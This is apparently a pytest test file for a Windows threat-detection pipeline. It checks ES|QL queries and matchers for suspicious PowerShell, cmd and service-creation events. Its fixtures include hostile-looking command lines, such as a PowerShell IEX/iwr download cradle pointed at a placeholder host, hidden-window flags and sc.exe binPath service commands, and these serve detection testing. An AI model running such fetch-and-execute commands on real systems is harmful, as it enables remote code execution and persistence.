"""Software fixtures only; historical detection evidence comes from the live runner."""

import copy

import pytest

from scripts.elastic_local import ROOT, load_json
from scripts.run_individual_detections import (
    END,
    check_baseline,
    check_manifest,
    choose_examples,
    esql,
    fetch_evidence,
    observed_conditions,
    read_query,
    source_matches,
    summarize,
    verify_readback,
)


def event(name="powershell.exe", command="powershell.exe -Command Get-Date", parent=None):
    return {
        "event": {"id": "fixture", "provider": "Microsoft-Windows-Sysmon", "code": "1"},
        "process": {"name": name, "command_line": command, "parent": {"name": parent}},
        "host": {"name": "TEST-HOST"},
        "@timestamp": "2024-01-01T00:00:00.123456789Z",
    }


def test_manifest_assignments_and_executable_files():
    manifest = load_json(ROOT / "detections/manifest.json")
    selection = load_json(ROOT / "analysis/technique_selection.json")
    check_manifest(manifest, selection)
    assert [t["attack_id"] for t in manifest["techniques"]] == [
        "T1059.001",
        "T1059.003",
        "T1543.003",
    ]
    for technique in manifest["techniques"]:
        for spec in technique["queries"]:
            query = read_query(ROOT, spec)
            assert query.startswith("FROM windows-apt-events-*\n| WHERE ")
            assert query.endswith("| LIMIT 10000")


@pytest.mark.parametrize("change", ["assignment", "cohort", "pointer", "unit", "missing_baseline"])
def test_manifest_rejects_contract_and_service_cohort_drift(change):
    manifest = load_json(ROOT / "detections/manifest.json")
    selection = load_json(ROOT / "analysis/technique_selection.json")
    service = manifest["techniques"][2]
    if change == "assignment":
        service["attack_id"] = "T9999.001"
    elif change == "cohort":
        service["queries"][2]["refines"] = "service_installation"
    elif change == "pointer":
        service["authoritative_refined_query_file"] = service["baseline_query_file"]
    elif change == "unit":
        service["matching_unit"] = "attacks"
    else:
        del service["queries"][2]["refines"]
    with pytest.raises(ValueError):
        check_manifest(manifest, selection)


@pytest.mark.parametrize(
    "predicate",
    [
        'windows_apt.annotations.attack.id == "T1059.001"',
        'windows_apt.scenario.id == "example"',
        'windows_apt.original.imagePath == "cmd.exe"',
        'threat.technique.id == "T1059.001"',
        'rule.name == "publisher label"',
    ],
)
def test_rejects_contextual_and_unindexed_predicates(tmp_path, predicate):
    path = tmp_path / "query.esql"
    path.write_text("FROM windows-apt-events-*\n| WHERE " + predicate + END)
    with pytest.raises(ValueError, match="Contextual"):
        read_query(tmp_path, {"file": path.name, "language": "esql"})


@pytest.mark.parametrize(
    "query",
    [
        "// pending placeholder",
        "FROM windows-apt-events-*" + END,
        'FROM windows-apt-events-*\n| WHERE event.code == "1"\n| MV_EXPAND host.name' + END,
        'FROM windows-apt-events-*\n| WHERE event.code == "1"\n| LIMIT 1' + END,
    ],
)
def test_rejects_placeholder_expansion_and_early_truncation(tmp_path, query):
    path = tmp_path / "query.esql"
    path.write_text(query)
    with pytest.raises(ValueError):
        read_query(tmp_path, {"file": path.name, "language": "esql"})


def test_distinct_count_and_nanos_are_exact_and_order_independent():
    rows = [
        {"event.id": "b", "host.name": "h", "@timestamp": "2024-01-01T00:00:00.1Z"},
        {"event.id": "a", "host.name": "h", "@timestamp": "2024-01-01T00:00:00.100000001Z"},
        {"event.id": "c", "host.name": None, "@timestamp": None},
    ]
    rows.append(copy.deepcopy(rows[0]))
    result = summarize(rows, 4)
    assert result == summarize(list(reversed(rows)), 4)
    assert result["raw_returned_rows"] == 4
    assert result["distinct_event_count"] == 3
    assert result["duplicate_returned_rows"] == 1
    assert result["event_ids"] == ["a", "b", "c"]
    assert result["unique_host_count"] == 1
    assert result["without_timestamp"] == 1
    assert result["historical_time_range"]["max_utc"].endswith(".100000001Z")
    assert summarize([], 0)["historical_time_range"]["min_utc"] is None


def test_count_export_and_conflicting_id_fail_closed():
    row = {"event.id": "a", "host.name": "h", "@timestamp": None}
    with pytest.raises(ValueError, match="truncated"):
        summarize([row], 2)
    with pytest.raises(ValueError, match="Conflicting"):
        summarize([row, row | {"host.name": "other"}], 2)
    with pytest.raises(ValueError, match="event ID"):
        summarize([{"event.id": None}], 1)


@pytest.mark.parametrize("count,timed", [(2059, 2059), (2060, 2059), (2061, 2061)])
def test_phase5_baseline_drift_is_a_contradiction(count, timed):
    spec = {"id": "powershell_baseline", "phase5_query_key": "powershell_execution"}
    prior = {"powershell_execution": {"count": 2060, "with_timestamp": 2060}}
    check_baseline(spec, {"distinct_event_count": 2060, "with_timestamp": 2060}, prior)
    with pytest.raises(ValueError, match="contradiction"):
        check_baseline(spec, {"distinct_event_count": count, "with_timestamp": timed}, prior)


@pytest.mark.parametrize(
    "command,expected",
    [
        ("powershell.exe -ExecutionPolicy Bypass -Command Get-Date", False),
        ("powershell.exe -NoProfile -Command Get-Date", False),
        ("PowerShell.exe -NoProfile -WindowStyle Hidden -Command Get-Date", True),
        ("powershell.exe -Command Invoke-WebRequest https://example.invalid", False),
        ("powershell.exe -Command IEX (iwr https://example.invalid)", True),
        ("powershell.exe -Command $iwr_variable = 1; $iex_variable = 2", False),
        (None, False),
    ],
)
def test_powershell_requires_combined_context(command, expected):
    record = event(command=command)
    assert source_matches("powershell_baseline", record)
    assert source_matches("powershell_refined", record) is expected
    record["event"]["provider"] = "Other"
    assert not source_matches("powershell_baseline", record)


def test_shell_switch_or_unusual_parent_alone_is_insufficient():
    record = event("cmd.exe", "cmd.exe /c echo fixture", "services.exe")
    assert source_matches("shell_baseline", record)
    assert not source_matches("shell_refined", record)
    record["process"]["command_line"] = "cmd.exe /c powershell.exe -Command Get-Date"
    assert source_matches("shell_refined", record)
    record["process"]["parent"]["name"] = None
    assert not source_matches("shell_refined", record)
    record["process"]["command_line"] = 'cmd.exe /c sc config Fixture binPath= "cmd.exe /c exit"'
    assert source_matches("shell_refined", record)


def test_services_keep_installation_create_config_and_registry_separate():
    creation = event("sc.exe", 'sc.exe create Fixture binPath= "cmd.exe /c exit"')
    config = event("sc.exe", 'sc.exe config Fixture binPath= "cmd.exe /c exit"')
    install = {"event": {"provider": "Service Control Manager", "code": "7045"}}
    registry = {
        "event": {"provider": "Microsoft-Windows-Sysmon", "code": "13"},
        "registry": {"path": r"HKLM\System\CurrentControlSet\Services\Fixture\ImagePath"},
    }
    cohorts = [
        "service_create_refined",
        "service_config_refined",
        "service_installation",
        "service_registry",
    ]
    for number, record in enumerate([creation, config, install, registry]):
        assert [q for q in cohorts if source_matches(q, record)] == [cohorts[number]]
    config["process"]["command_line"] = 'sc.exe config Fixture binPath= "fixture.exe"'
    assert source_matches("service_config_baseline", config)
    assert not source_matches("service_config_refined", config)


def test_missing_fields_and_metadata_independence():
    assert not any(observed_conditions({}).values())
    for query_id in [
        "powershell_refined",
        "shell_refined",
        "service_create_refined",
        "service_registry",
        "service_installation",
    ]:
        assert not source_matches(query_id, {})
    record = event(command="powershell.exe -nop -w hidden -c Get-Date")
    changed = copy.deepcopy(record)
    changed["windows_apt"] = {
        "annotations": {"attack": {"id": "T9999.999"}},
        "scenario": {"id": "unrelated"},
    }
    assert source_matches("powershell_refined", changed) == source_matches(
        "powershell_refined", record
    )
    with pytest.raises(ValueError, match="No independent source verifier"):
        source_matches("unknown_query", record)


def test_every_representative_id_and_claim_must_match_source():
    record = event()
    row = {"event.id": "fixture", "host.name": "TEST-HOST", "@timestamp": record["@timestamp"]}
    verify_readback([row], {"fixture": record}, "powershell_baseline")
    with pytest.raises(ValueError, match="Missing live event"):
        verify_readback([row], {}, "powershell_baseline")
    with pytest.raises(ValueError, match="Host"):
        verify_readback(
            [row | {"host.name": "different"}], {"fixture": record}, "powershell_baseline"
        )
    with pytest.raises(ValueError, match="Timestamp"):
        verify_readback([row | {"@timestamp": None}], {"fixture": record}, "powershell_baseline")
    with pytest.raises(ValueError, match="condition mismatch"):
        verify_readback([row | {"retrieval": True}], {"fixture": record}, "powershell_baseline")
    with pytest.raises(ValueError, match="Source does not support"):
        verify_readback([row], {"fixture": record}, "powershell_refined")
    assert choose_examples(["fixture"], {"fixture": record}, True) == ["fixture"]


@pytest.mark.parametrize("partial", [True, None])
def test_esql_rejects_partial_or_uncertain_responses(partial):
    def client(path, body, method):
        assert "allow_partial_results=false" in path
        return {"is_partial": partial, "columns": [], "values": []}

    with pytest.raises(ValueError, match="partial"):
        esql("FROM fixture", client)


def test_evidence_readback_batches_more_than_10000_ids_and_preserves_all_matches():
    ids = [f"fixture-{i:05}" for i in range(10001)]
    batches = []

    def client(path, body, method):
        batch = body["query"]["ids"]["values"]
        assert len(batch) <= 1000
        hits = []
        if "search_after" not in body:
            batches.append(batch.copy())
            hits = [{"_source": {"event": {"id": i}}, "sort": [i]} for i in batch]
        return {"_shards": {"failed": 0}, "hits": {"hits": hits}}

    records = fetch_evidence(list(reversed(ids)) + ids[:1], client)
    assert [e["event"]["id"] for e in records] == ids
    assert len(batches) == 11


def test_evidence_readback_rejects_missing_requested_ids():
    def client(path, body, method):
        return {"_shards": {"failed": 0}, "hits": {"hits": []}}

    with pytest.raises(ValueError, match="absent"):
        fetch_evidence(["fixture"], client)
